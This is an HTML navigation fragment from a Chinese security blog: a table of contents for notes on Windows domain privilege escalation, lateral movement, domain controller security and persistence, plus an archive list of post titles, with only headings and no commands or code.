href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">第四章 权限提升分析及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 系统内核溢出漏洞提权分析及防范</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%89%8B%E5%8A%A8%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8F%91%E7%8E%B0%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81"><span class="toc-number">4.1.1.</span> <span class="toc-text">通过手动执行命令发现缺失补丁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS16-032"><span class="toc-number">4.1.2.</span> <span class="toc-text">MS16-032</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MSF%E5%8F%91%E7%8E%B0%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81"><span class="toc-number">4.1.3.</span> <span class="toc-text">利用MSF发现缺失补丁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Exploit-Suggester"><span class="toc-number">4.1.4.</span> <span class="toc-text">Windows Exploit Suggester</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell%E4%B8%AD%E7%9A%84Sherlock"><span class="toc-number">4.1.5.</span> <span class="toc-text">Powershell中的Sherlock</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%80%A5%E7%94%A8%E5%88%86%E6%9E%90%E5%92%8C%E9%98%B2%E8%8C%83"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 Windows操作系统配置错误急用分析和防范</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">4.2.1.</span> <span class="toc-text">系统服务权限配置错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AEAlwaysInstallElevated"><span class="toc-number">4.2.2.</span> <span class="toc-text">注册表键AlwaysInstallElevated</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E4%BF%A1%E4%BB%BB%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.3.</span> <span class="toc-text">可信任服务路径漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.4.</span> <span class="toc-text">自动安装配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">4.2.5.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Empire%E7%9A%84Powerup%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.6.</span> <span class="toc-text">Empire的Powerup模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 组策略首选项提权分析及防范</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 绕过UAC提权分析及防范</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E4%B8%AD%E7%9A%84bypassuac"><span class="toc-number">4.4.1.</span> <span class="toc-text">MSF中的bypassuac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E4%B8%AD%E7%9A%84RunAs"><span class="toc-number">4.4.2.</span> <span class="toc-text">MSF中的RunAs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nishang%E4%B8%AD%E7%9A%84Invoke-PsUACme%E6%A8%A1%E5%9D%97"><span class="toc-number">4.4.3.</span> <span class="toc-text">Nishang中的Invoke-PsUACme模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Empire%E4%B8%AD%E7%9A%84bypassuac%E6%A8%A1%E5%9D%97"><span class="toc-number">4.4.4.</span> <span class="toc-text">Empire中的bypassuac模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 令牌窃取分析及防范</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">4.5.1.</span> <span class="toc-text">令牌窃取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rotten-Potato%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90"><span class="toc-number">4.5.2.</span> <span class="toc-text">Rotten Potato本地提权分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">4.5.3.</span> <span class="toc-text">添加域管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Empire%E4%B8%8B%E7%9A%84%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90"><span class="toc-number">4.5.4.</span> <span class="toc-text">Empire下的令牌窃取分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6-%E6%97%A0%E5%87%AD%E8%AF%81%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83"><span class="toc-number">4.6.</span> <span class="toc-text">4.6 无凭证条件下的权限获取分析及防范</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">第五章 域内横向移动分析及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E5%B8%B8%E7%94%A8Windows%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%92%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 常用Windows远程连接和命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-6-WMI"><span class="toc-number">5.2.</span> <span class="toc-text">5.6 WMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-8-SMBEXEC"><span class="toc-number">5.3.</span> <span class="toc-text">5.8 SMBEXEC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-9-DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">5.4.</span> <span class="toc-text">5.9 DCOM在远程系统中的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0DCOM%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">5.4.1.</span> <span class="toc-text">通过本地DCOM执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E6%9C%BA%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">5.4.2.</span> <span class="toc-text">使用DCOM在远程机器上执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-10-SPN%E5%9C%A8%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">5.5.</span> <span class="toc-text">5.10 SPN在域环境中的应用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-11-Exchange%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E9%98%B2%E8%8C%83"><span class="toc-number">5.6.</span> <span class="toc-text">5.11 Exchange邮件服务器安全防范</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8"><span class="toc-number">6.</span> <span class="toc-text">第六章 域控制器安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-NTDS-dit"><span class="toc-number">6.1.</span> <span class="toc-text">6.1 NTDS.dit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-%E5%AF%BC%E5%87%BAntds-dit%E4%B8%AD%E7%9A%84%E6%95%A3%E5%88%97%E5%80%BC"><span class="toc-number">6.2.</span> <span class="toc-text">6.2 导出ntds.dit中的散列值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-3-%E5%88%A9%E7%94%A8dcsync%E8%8E%B7%E5%8F%96%E6%95%A3%E5%88%97%E5%80%BC"><span class="toc-number">6.3.</span> <span class="toc-text">6.3 利用dcsync获取散列值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-4-%E4%BD%BF%E7%94%A8MSF%E8%8E%B7%E5%8F%96%E6%95%A3%E5%88%97%E5%80%BC"><span class="toc-number">6.4.</span> <span class="toc-text">6.4 使用MSF获取散列值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-6-Kerberos%E4%B8%8E%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E8%8C%83"><span class="toc-number">6.5.</span> <span class="toc-text">6.6 Kerberos与用户提权漏洞分析与防范</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E7%AB%A0-%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">7.</span> <span class="toc-text">第七章 跨域攻击分析与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90"><span class="toc-number">7.1.</span> <span class="toc-text">7.2 利用域信任关系的跨域攻击分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">7.1.1.</span> <span class="toc-text">获取域信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-3-%E9%98%B2%E8%8C%83%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB"><span class="toc-number">7.2.</span> <span class="toc-text">7.3 防范跨域攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-number">8.</span> <span class="toc-text">第八章 权限维持分析及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E8%8C%83"><span class="toc-number">8.1.</span> <span class="toc-text">8.1 操作系统后门分析与防范</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8"><span class="toc-number">8.1.1.</span> <span class="toc-text">粘滞键后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5%E5%90%8E%E9%97%A8"><span class="toc-number">8.1.2.</span> <span class="toc-text">注册表注入后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">8.1.3.</span> <span class="toc-text">计划任务后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meterpreter%E5%90%8E%E9%97%A8"><span class="toc-number">8.1.4.</span> <span class="toc-text">meterpreter后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cymothoa%E5%90%8E%E9%97%A8"><span class="toc-number">8.1.5.</span> <span class="toc-text">Cymothoa后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI%E5%90%8E%E9%97%A8"><span class="toc-number">8.1.6.</span> <span class="toc-text">WMI后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-2-WEB%E5%90%8E%E9%97%A8"><span class="toc-number">8.2.</span> <span class="toc-text">8.2 WEB后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nishang%E4%B8%8B%E7%9A%84WEBShell"><span class="toc-number">8.2.1.</span> <span class="toc-text">Nishang下的WEBShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weevely%E5%90%8E%E9%97%A8"><span class="toc-number">8.2.2.</span> <span class="toc-text">Weevely后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webacoo%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">8.2.3.</span> <span class="toc-text">webacoo后门工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-3-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E8%8C%83"><span class="toc-number">8.3.</span> <span class="toc-text">8.3 域控制器权限持久化分析与防范</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DSRM%E5%90%8E%E9%97%A8"><span class="toc-number">8.3.1.</span> <span class="toc-text">DSRM后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSP%E7%BB%B4%E6%8C%81%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">8.3.2.</span> <span class="toc-text">SSP维持域控权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SID-History%E5%90%8E%E9%97%A8"><span class="toc-number">8.3.3.</span> <span class="toc-text">SID History后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Golden-Ticket-and-Silver-Ticket"><span class="toc-number">8.3.4.</span> <span class="toc-text">Golden Ticket and Silver Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Skeleton-Key"><span class="toc-number">8.3.5.</span> <span class="toc-text">Skeleton Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hook-PasswordChangeNotify"><span class="toc-number">8.3.6.</span> <span class="toc-text">Hook PasswordChangeNotify</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-4-Nishang%E4%B8%8B%E7%9A%84%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E8%8C%83"><span class="toc-number">8.4.</span> <span class="toc-text">8.4 Nishang下的脚本后门分析与防范</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Backdoor"><span class="toc-number">8.4.1.</span> <span class="toc-text">HTTP-Backdoor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-ScrnSaveBackdoor"><span class="toc-number">8.4.2.</span> <span class="toc-text">Add-ScrnSaveBackdoor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Execute-OnTime"><span class="toc-number">8.4.3.</span> <span class="toc-text">Execute-OnTime</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Invoke-ADSBackdoor"><span class="toc-number">8.4.4.</span> <span class="toc-text">Invoke-ADSBackdoor</span></a></li></ol></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 75
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2088 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span>
+            <a class="archive-post-title" href="/2088/08/08/readme/">README</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2021 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span>
+            <a class="archive-post-title" href="/2021/10/03/UAC%E6%8F%90%E6%9D%83/">CVE-2019-1388 UAC提权</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span>
+            <a class="archive-post-title" href="/2021/10/03/RPC%E6%8F%90%E6%9D%83/">RPC提权</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span>
+            <a class="archive-post-title" href="/2021/10/03/msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/">msf生成木马小结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span>
+            <a class="archive-post-title" href="/2021/10/03/nullptr/">NULL、0、nullptr 区别分析</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span>
+            <a class="archive-post-title" href="/2021/07/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E4%B8%8E%E7%BA%BF%E7%A8%8B%E4%BA%92%E6%96%A5/">线程同步与线程互斥</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/16</span>
+            <a class="archive-post-title" href="/2021/07/16/win32%E4%B8%B4%E7%95%8C%E5%8C%BA%E4%BA%92%E6%96%A5%E4%BD%93/">临界区与互斥体</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/05</span>
+            <a class="archive-post-title" href="/2021/07/05/vmtest/">一种简单的反虚拟机调试方法</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span>
+            <a class="archive-post-title" href="/2021/06/17/win32/">win32</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span>
+            <a class="archive-post-title" href="/2021/06/16/C++%E4%BA%8C%E5%8F%89%E6%A0%91/">C++二叉树实现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span>
+            <a class="archive-post-title" href="/2021/06/15/C++%E9%93%BE%E8%A1%A8/">C++链表实现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/11</span>
+            <a class="archive-post-title" href="/2021/06/11/certutil%E6%8E%A2%E7%A9%B6/">certutil探究</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2021/06/10/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%80%BB%E7%BB%93/">横向移动总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/09</span>
+            <a class="archive-post-title" href="/2021/06/09/mimikatz/">从mimikatz抓取密码学习攻防</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span>
+            <a class="archive-post-title" href="/2021/06/08/LLMNR%E5%92%8CNetBIOS%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/">LLMNR和NetBIOS欺骗攻击分析及防范</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/03</span>
+            <a class="archive-post-title" href="/2021/06/03/C++/">C++</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span>
+            <a class="archive-post-title" href="/2021/06/01/%E7%BC%96%E5%86%99exp/">如何编写属于自己的第一个exp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span>
+            <a class="archive-post-title" href="/2021/05/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
